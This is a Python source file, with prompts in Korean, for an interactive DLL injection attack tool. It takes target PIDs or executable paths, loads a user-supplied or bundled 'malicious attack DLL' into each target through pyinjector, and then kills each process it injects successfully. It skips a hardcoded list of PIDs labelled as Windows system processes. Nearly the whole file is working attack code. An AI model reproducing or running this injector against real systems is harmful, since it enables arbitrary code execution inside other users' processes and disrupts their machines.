import os
from pyinjector import inject
import subprocess
import psutil
from pywinauto import *


class injection():
    
    def __init__(self):
        print("\n\nExecute DLL Injection mode------------------------------------------")
        input_op = input("\n입력할 옵션을 선택하시오.\n1. PID 입력하기    2. exe 경로 입력하기\n번호 입력:")
        print("\n")
        self.pid=[]
        if input_op == '1':
            self.in_PID()
        elif input_op == '2':
            self.in_exe()
        else:
            print('ERROR::Wrong number..')
            ans = input('Do you want to try again? yes = \'y\', No =\'q\'\ninput: ')
            print('\n')
            if ans == 'y':
                self.__init__()
            else: 
                print("\n\n--End the program--\n")
                return
        
        self.attack()
               
    def in_PID(self):
        del_pidlist = [0, 4, 120, 540, 748, 848, 860, 908, 916, 948,
                       988, 1196, 1256, 1420, 1424, 1436, 1456, 1468, 1548, 1628,
                       1740, 1748, 1812, 1820, 1828, 1924, 2000, 2072, 2096, 2172,
                       2204, 2220, 2284, 2368, 2424, 2448, 2512, 2584, 2608, 2616,
                       2832, 3012, 3024, 3160, 3180, 3232, 3472, 3568, 3656, 3708,
                       3724, 3744, 3828, 3888, 3972, 4116, 4364, 4372, 4424, 4464,
                       4712, 4788, 5088, 5424, 5444, 5804, 5888, 6440, 8224, 8248,
                       8344, 8484, 8620, 8724, 8744, 8852, 9272, 9312, 9612, 9820,
                       10228, 10236, 10408, 11228, 11540, 11852, 13152, 13712, 14300, 15280,
                       16536, 17396]
        print('<안내 - PID를 입력해주세요>')
        pid_in = input('pid 1개 입력 시 맨 앞에 \'o\', 2개 이상 입력 시 \'m\' 명령어를 입력해주세요.\n예시> 1개 -> o pid\n      2개 이상 -> m pid pid ...\n입력할 명령어:')
        pid_arr = pid_in.split(' ')
        self.pid = []
        del_index = []
        if pid_arr[0] == 'o':
            pid_arr.pop(0)
            self.pid.append(pid_arr[0])
            
        elif pid_arr[0] == 'm':
            pid_arr.pop(0)
            print('\n<안내 - 2개 이상의 PID를 입력받았습니다.>\n')
            print('<안내 - Windows의 기본 프로세스 PID를 필터링합니다.>')
            for i in range(0, len(pid_arr)):
                if int(pid_arr[i]) in del_pidlist:
                    print(f'WARNING::You cannot attack PID \'{pid_arr[i]}\'')
                    del_index.insert(0, i)
            for i in del_index:
                pid_arr.pop(i)
                    
            self.pid= pid_arr
                
                                
        else: 
            print('\nERROR::Wrong command..')
            ans = input('Do you want to try again? yes = \'y\', No =\'q\'\ninput: ')
            print('\n')
            if ans == 'y':
                self.__init__()
            else: 
                print("\n\n--End the program--\n")
                return 
                    
        
        print('\n<안내 - PID를 성공적으로 입력받았습니다.>')
        print("Attackable PID:", * self.pid)
        print("\n")
        
    def create_process(self,path):
            return subprocess.Popen([path]).pid
    def U_dll(self):
        print("<안내 - 공격용 악성 dll 옵션을 입력해주세요>")
        dll_op = input('1. 직접 dll 입력하기\t2. 제공되는 dll 사용하기\n입력할 명령어:')
        if dll_op == '1':
            print('\n<안내 - \'직접 dll 입력하기\'를 선택하셨습니다.>')
            dll__in=input('사용하실 dll의 경로를 입력해주세요.\n입력할 경로:')
            
        elif dll_op == '2':
            print('\n<안내 - \'제공되는 dll 사용하기\'를 선택하셨습니다.>')
            
            dll__in = os.getcwd() + "/test.dll"
            dll__in = dll__in.replace("\\","/")
        else: 
            print('\nERROR::Wrong number..')
            ans = input('Do you want to try again? yes = \'y\', No =\'q\'\ninput: ')
            if ans == 'y':
                self.U_dll()
            else: 
                print("\n\n--End the program--\n")
                return

        print('\n<안내 - dll 경로 설정을 완료했습니다.>\n')
        return dll__in    
    def in_exe(self):
        print('<안내 - exe 경로 입력 옵션을 선택해주세요>')
        exe_op = input('1. 경로 1개 입력\n2. 경로 2개 이상 입력 시\n입력할 명령어:')
        self.exe_in = []
        print(f'\n<안내 - {exe_op}개의 exe 경로 입력해주세요>')
        if exe_op == '1':
            exe_in = input("입력:")
            self.exe_in.append(exe_in)
            
        elif exe_op == '2':
            exe_in = input("\"경로1\" \"경로2\" 형태로 입력해주세요.\n입력:")
            exe_in = exe_in.split(' ')
            for i in exe_in:
                self.exe_in.append(i)
        else: 
            print('\nERROR::Wrong number..')
            ans = input('Do you want to try again? yes = \'y\', No =\'q\'\ninput: ')
            if ans == 'y':
                self.in_exe()
            else: 
                print("\n\n--End the program--\n")
                return 
        for i in self.exe_in:
            if(os.path.isfile(i)):
                pass
            else:
                print('\nERROR::Wrong exe Path')
                ans = input('Do you want to try again? yes = \'y\', No =\'q\'\ninput: ')
                if ans == 'y':
                    self.in_exe()
                else: 
                    print("\n\n--End the program--\n")
                    return
        print('\n<안내 - exe 경로를 성공적으로 입력받았습니다.>')
        self.attack()
    #find_process에서 찾은 pid를 악성 dll을 이용하여 인젝션 해보기
    def attack(self):
        
        path_dll = self.U_dll()
        if len(self.pid) == 0:
            for i in self.exe_in:
                self.pid.append(self.create_process(i))
        for i in range(0,len(self.pid)):
            print(f'{len(self.pid)}개의 pid 중 {i+1}번째 pid로의 Injection!')
            pid = int(self.pid[i])
            result = inject(pid,path_dll)
            
            if(str(type(result)) == "<class 'int'>"):
                psutil.Process(pid).kill() 
                print(str(pid) + " 인젝션 성공!")    
            
            else:
                print("\nERROR::Injection Attack Fail")
                
        print("\n\n--End the program--\n")
        exit(0)
                
        
        